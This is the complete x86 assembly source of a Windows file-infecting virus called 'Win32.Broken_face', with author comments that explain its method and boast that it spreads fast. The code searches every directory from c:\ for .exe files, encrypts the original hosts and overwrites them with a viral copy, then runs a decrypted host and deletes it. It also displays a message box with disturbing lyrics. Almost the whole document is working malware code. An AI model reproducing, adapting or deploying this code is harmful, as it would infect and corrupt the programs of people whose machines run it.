;                           ___________________
;                          | Win32.Broken_face |
;                          | __________________|
;               ___________||
;[ Information ]
;First, virus moves to the root directory, and scans for
;directorys.It enters them and checks for executables.If
;no files found or more files needed, then looks  in the
;current directory for another subdir. If there isnt any
;it goes back and enters  another dir etc  etc. Encrypts
;hostfiles ( marked with _ in front of  their name ) and
;when its time to execute a host, it decrypts it  into a
;file marked with $, executes it, and keeps  deleting it
;until  the file exits so the decrypted file dissapears.
;Sick method, could not  think of  anything else, but it
;works  fine. Infected  hosts keep  the original size if
;they are smaller than 8192 bytes.Thats all. Be carefull
;if you think of experimenting with it,spreads faaassst.

.386
.model flat
.data
fuck dd 0
shit dd 0
ftel dd ?
tdata db 318 dup (?)
target dd ?
Nbytes dd 0
newhandle dd ?
depth db 0
filehandle db 40 dup (?)
find_data db 3180 dup (?)
xdata db 318 dup (?)
files2eat db 0eh  
xhandle dd 0
msg db "There was this boy",0dh,"who had two chlidren",0dh
db "with his sisters",0dh,"They were his daughters",0dh
db "They were his favourite lovers",0dh,"I got no lips,I got no tounge"
db 0dh,"Where there were eyes there's only space",0dh
db "I got no lips, I got no tounge",0dh,"I GOT A BROKEN FACE!",0
.code
extrn ExitProcess:proc
extrn MessageBoxA:proc
extrn FindFirstFileA:proc
extrn FindNextFileA:proc
extrn SetCurrentDirectoryA:proc
extrn DeleteFileA:proc
extrn FindClose:proc
extrn CreateFileA:proc
extrn GetCurrentDirectoryA:proc
extrn ReadFile:proc
extrn WriteFile:proc
extrn CloseHandle:proc
extrn WinExec:proc
extrn GetCommandLineA:proc
extrn CreateProcessA:proc

start:
sub esp,1024
mov ebp,esp
call GetCommandLineA
inc eax
mov [ftel],eax
laos:
cmp byte ptr [eax],'"'
je monday
inc eax
jmp laos
monday:
mov byte ptr [eax],0
mov dword ptr [fuck],eax
push offset root
call SetCurrentDirectoryA
xor esi,esi    ;for find_data
xor edi,edi    ;for filehandle

find1stdir:
lea eax,[find_data+esi]
push eax
push offset dirmasker
call FindFirstFileA
mov dword ptr [filehandle+edi],eax
cmp dword ptr [find_data+esi],10h ;check if it is a dir
jne find2nddir
cmp byte ptr [find_data+esi+44],"."
je find2nddir
getin:
lea eax,[find_data+44+esi]
push eax
call SetCurrentDirectoryA
inc byte ptr [depth]
push offset xdata
push offset exefile
call FindFirstFileA
cmp eax,-1
jnz fne1 

dam:
add edi,4
add esi,313
jmp find1stdir
fne1:
mov bh,byte ptr [xdata+43]
mov [xhandle],eax
jmp infect
fne2:
mov byte ptr [xdata+43],bh
push offset xdata
mov eax,[xhandle]
push eax
call FindNextFileA
or eax,eax
jz dam

infect:
cmp byte ptr [xdata+44],'_'
je fne2

mov bh,byte ptr [xdata+43]
mov byte ptr [xdata+43],'_'
push offset tdata
push offset xdata+43
call FindFirstFileA
cmp eax,-1
jnz fne2

dmf:
xor edx,edx
push edx
push 2                       
push 1                       
push edx                     
push edx                    
push 40000000h              
push offset xdata+43
call CreateFileA
cmp eax,-1    
je end         ; failed. back in the box :(
mov [newhandle],eax

xor edx,edx
push edx
push edx
push 3
push edx
push edx
push 80000000h 
push offset xdata+44
call CreateFileA
mov [target],eax
mov byte ptr [shit],66
call copyfile
call ftopen
xor edx,edx
push edx
push 80
push 3
push edx
push edx
push 40000000h
push offset xdata+44
call CreateFileA
mov [newhandle], eax
call copyfile
jmp end
getback:
cmp byte ptr [depth],0
je realend
dec byte ptr [depth]
push dword ptr [edi+filehandle]
call FindClose
sub esi,313
sub edi,4
push offset cdback
call SetCurrentDirectoryA
jmp find2nddir

goroot:
xor esi,esi
mov edi,esi
mov byte ptr [depth],0
push offset root
call SetCurrentDirectoryA ;move to c:\

find2nddir:
lea eax,[find_data+esi]
push eax
push dword ptr [filehandle+edi]
call FindNextFileA
or eax,eax
jz getback
cmp dword ptr [find_data+esi],10h
jne find2nddir
cmp byte ptr [find_data+esi+44],'.'
je find2nddir
jmp getin

end:
dec byte ptr [files2eat]
cmp byte ptr [files2eat],0
jne fne2
realend:
call dencrypt

push 5
push dword ptr [ftel]
call WinExec

cmp eax,31
jg fuckup

push 0
push offset tag+1
push offset msg
push 0
call MessageBoxA
jmp deadend
fuckup:
push dword ptr [ftel]
call DeleteFileA
or eax,eax
jz fuckup

deadend:
push 0
call ExitProcess

exefile db '*.exe',0
dirmasker db '*.',0
root db 'c:\',0
cdback db '..',0
tag db '[Broken_face',0,'coded by SuperMovah/MISP]'

copyfile:
push 0
push offset Nbytes
push 1024
push ebp
mov eax,[target]
push eax
call ReadFile
mov eax,[Nbytes]
or eax,eax
jz gbgb

cmp byte ptr [shit],66
je enchost

bck:
push 0
push offset Nbytes
push [Nbytes]
push ebp
mov eax,[newhandle]
push eax
call WriteFile
jmp copyfile

gbgb:
push dword ptr [newhandle]
call CloseHandle
push dword ptr [target]
call CloseHandle
mov byte ptr [shit],0
ret

enchost:
push esi
mov esi,ebp
mov ecx,100h
xor bx,bx
ench:
add bx,cx
xor word ptr [esi],bx
inc esi
inc esi
loop ench
pop esi

mov byte ptr [shit],66
jmp bck

dencrypt:
mov esi,dword ptr [fuck]
Tuesday:
cmp byte ptr [esi],'\'
je google
dec esi
loop Tuesday
google:
inc esi
mov al,byte ptr [esi]
mov byte ptr [esi],'_'

Friday:
inc esi
mov bl,byte ptr [esi]
mov byte ptr [esi],al
cmp byte ptr [esi],0
jz Sunday
inc esi
mov al,byte ptr [esi]
mov byte ptr [esi],bl
cmp byte ptr [esi],0
jnz Friday
Sunday:
call ftopen

mov esi, dword ptr [ftel]
ghho:
inc esi
cmp byte ptr [esi],'_'
jne ghho
mov byte ptr [esi],'$'
xor edx,edx
push edx
push 2
push 1
push edx
push 1
push 40000000h
push dword ptr [ftel]
call CreateFileA
mov [newhandle], eax
mov byte ptr [shit],66
call copyfile
ret

ftopen:
xor edx,edx
push edx
push edx
push 3
push edx
push 1
push 80000000h
push dword ptr [ftel]
call CreateFileA
mov [target],eax
ret
end start
;2-9-2004
